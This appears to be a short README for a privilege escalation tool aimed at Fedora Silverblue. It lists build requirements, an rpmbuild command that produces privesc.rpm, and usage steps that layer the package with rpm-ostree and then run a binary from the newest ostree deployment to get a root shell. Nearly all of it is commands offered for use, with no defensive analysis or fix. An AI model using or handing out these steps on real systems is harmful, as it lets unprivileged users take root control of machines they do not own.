A Fedora Silverblue privilege escalation tool that uses `rpm-ostree`.

## Building

**Requirements:**

- `rpmbuild` (`dnf install rpmdevtools`)
- `gcc`
- `glibc-static`

```bash
rpmbuild --bb --define "_rpmdir $(pwd)" --define "_rpmfilename privesc.rpm" privesc.spec
```
This generates `privesc.rpm` in the current directory.

## Usage

```bash
# Layer package
rpm-ostree install privesc.rpm
# Enter root shell
"$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)"/usr/bin/privesc
```
